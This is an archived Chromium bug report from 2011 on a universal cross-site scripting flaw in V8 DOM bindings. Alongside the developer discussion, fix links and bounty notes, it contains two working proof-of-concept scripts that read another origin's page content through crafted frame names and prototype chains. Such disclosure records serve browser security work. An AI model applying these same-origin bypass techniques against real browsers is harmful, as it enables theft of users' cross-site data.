# UXSS via Object::GetRealNamedPropertyInPrototypeChain

| Field | Value |
|-------|-------|
| **Issue ID** | [40095231](https://issues.chromium.org/issues/40095231) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | se...@gmail.com |
| **Assignee** | ab...@chromium.org |
| **Created** | 2011-09-16 |
| **Bounty** | $2,337.00 |

## Description

**VULNERABILITY DETAILS**  

As in <http://code.google.com/p/chromium/issues/detail?id=95671>, an attacker changes the name of a child frame, however, this time it's set to the name of one of the window.**proto** properties.

Then Object::GetRealNamedPropertyInPrototypeChain is used to get that property as it skips any interceptors, including the one that is supposed to return the child window.

**VERSION**  

Google Chrome 14.0.835.163 (101024)  

Google Chrome 16.0.883.0 (101461) canary

**REPRODUCTION CASE**  

(V8HTMLAllCollection::namedPropertyGetter calls GetRealNamedPropertyInPrototypeChain)

<script>
window.onload = function()
{
frame = document.body.appendChild(document.createElement("iframe"));
frame.src = "http://google.com";
frame.onload = function() {
frame.onload = null;
frame.contentWindow[0].location = "data:text/html,<script>(" + function() {
window.name = "alert";
obj = document.all;
obj.\_\_proto\_\_ = parent;
alert(obj.alert.constructor("return document.body.innerHTML")());
} + ")()</scr" + "ipt>";
}
}
</script>

## Attachments

- [repro-6.html](attachments/repro-6.html) (text/html; charset=us-ascii, 570 B)

## Timeline

### sc...@gmail.com (2011-09-16)

Adam, did you have any initial idea on whether this is another bindings issue or something more internal to v8?

### ab...@chromium.org (2011-09-16)

I suspect we're screwing up in document.all.  That beast is very complex.

### se...@gmail.com (2011-09-16)

HTMLAllCollection is not the only class that uses GetRealNamedPropertyInPrototypeChain.  There are also DOMStringMap, NamedNodeMap, Storage etc.

### ab...@chromium.org (2011-09-16)

Thanks.  I'll look at them all.

### in...@chromium.org (2011-09-17)

[Empty comment from Monorail migration]

### ab...@chromium.org (2011-09-19)

https://bugs.webkit.org/show_bug.cgi?id=68393

### ab...@chromium.org (2011-09-19)

http://trac.webkit.org/changeset/95489

### ab...@chromium.org (2011-09-19)

I forget how I'm supposed to set these flags.

### in...@chromium.org (2011-09-19)

Adam, should i merge these to m15 beta scheduled for 7pm or you think it is better to let this bake through one dev channel.

### ab...@chromium.org (2011-09-19)

These are going to be fine, but it seems safer to wait for the next beta release.

### se...@gmail.com (2011-09-20)

Sorry Adam, I didn't mention this case before.
This is still exploitable with Object::GetRealNamedProperty (which is called from V8DOMWindow::namedPropertyGetter in the following repro case):
<script>
window.onload = function()
{
    frame = document.body.appendChild(document.createElement("iframe"));
    frame.src = "http://google.com";
    frame.onload = function() {
        frame.onload = null;

        frame.contentWindow[0].location = "data:text/html,<script>(" + function() {
            window.name = "valueOf";
            obj = window.open();
            obj.__proto__.__proto__ = parent;
            alert(obj.valueOf.constructor("return document.body.innerHTML")());
        } + ")()</scr" + "ipt>";
    }
}
</script>

### ab...@chromium.org (2011-09-20)

Thanks.  I'll investigate that variation.

### in...@chromium.org (2011-09-23)

merged to m15 in r95814

### js...@chromium.org (2011-09-26)

[Empty comment from Monorail migration]

### ab...@chromium.org (2011-09-26)

Sorry, Serg.  I forgot about the variation on this one.  I've got it reproing now.

### ab...@chromium.org (2011-09-26)

Ah, I see why I missed that one in my grep.  Thanks!

### ab...@chromium.org (2011-09-26)

https://bugs.webkit.org/show_bug.cgi?id=68840

### in...@chromium.org (2011-09-29)

http://trac.webkit.org/changeset/96341

need to merge this to m15. for m14, needs both r95489 and r96341.

### in...@chromium.org (2011-09-29)

merged to m15 in r96370

### in...@chromium.org (2011-09-29)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-09-29)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### sc...@gmail.com (2011-10-19)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-10-19)

Thanks Serg. Leet bump to $2337 for catching the fact the the first fix missed a facet.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2011-10-19)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-10-28)

Payment in system, can take up to a couple of weeks.

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-09-28)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### ad...@google.com (2020-11-03)

[Empty comment from Monorail migration]

### ad...@google.com (2020-11-03)

[Empty comment from Monorail migration]

### aw...@google.com (2023-08-28)

[Empty comment from Monorail migration]

### is...@google.com (2023-08-28)

This issue was migrated from crbug.com/chromium/96885?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40095231)*
